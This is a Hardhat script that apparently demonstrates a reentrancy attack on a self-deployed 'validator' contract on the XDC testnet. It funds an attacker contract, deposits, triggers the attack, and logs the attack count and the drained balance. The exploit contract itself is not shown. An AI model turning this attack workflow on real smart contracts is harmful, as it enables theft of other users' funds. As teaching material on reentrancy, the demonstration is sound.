const hre = require("hardhat");
const fs = require("fs");
const { ethers } = hre;
//counter=0;

async function main() {
const { validator, attacker } = JSON.parse(fs.readFileSync("deployed-addresses.json"));
const attackContract = await hre.ethers.getContractAt("ReentrancyAttack", attacker);
const [deployer] = await hre.ethers.getSigners();

console.log("🪙 Step 1: Funding attacker with 3 XDC...");
try {
const tx1 = await deployer.sendTransaction({
to: attacker,
value: ethers.parseEther("3")
});
await tx1.wait();
console.log("✅ Attacker contract funded.");
} catch (err) {
console.error("❌ Funding failed:", err.message || err);
return;
}

// Optional: check balance
const attackerBalance = await hre.ethers.provider.getBalance(attacker);
console.log("🔎 Attacker contract balance before prepare():", ethers.formatEther(attackerBalance), "TXDC");

if (attackerBalance < ethers.parseEther("0.1")) {
console.log("❌ Attacker contract has insufficient balance — cannot proceed.");
return;
}

console.log("🧩 Step 2: Attacker depositing into validator...");
try {
const tx2 = await attackContract.prepare();
await tx2.wait();
console.log("✅ Deposit from attacker to validator completed.");
} catch (err) {
console.error("❌ Deposit failed, reentrancy attack failed:", err.message || err);
return;
}

console.log("⚔️ Step 3: Launching reentrancy attack...");

try {
  const tx3 = await attackContract.attack(ethers.parseEther("0.1"));
  await tx3.wait();

  // ✅ Read attackCount from attacker contract
  const count = await attackContract.attackCount();

  console.log(`✅ Attack executed ${count.toString()} times.`);
} catch (err) {
  console.error("❌ Attack failed:", err);
}

try {
const finalBalance = await hre.ethers.provider.getBalance(attacker);
console.log("💰 Attacker contract balance after attack:", ethers.formatEther(finalBalance), "TXDC, instead of 0.1 TXDC");
} catch (err) {
console.error("❌ Failed to fetch final balance:", err.message || err);
}
}

main().catch((error) => {
console.error("❌ Script error:", error.message || error);
process.exitCode = 1;
});
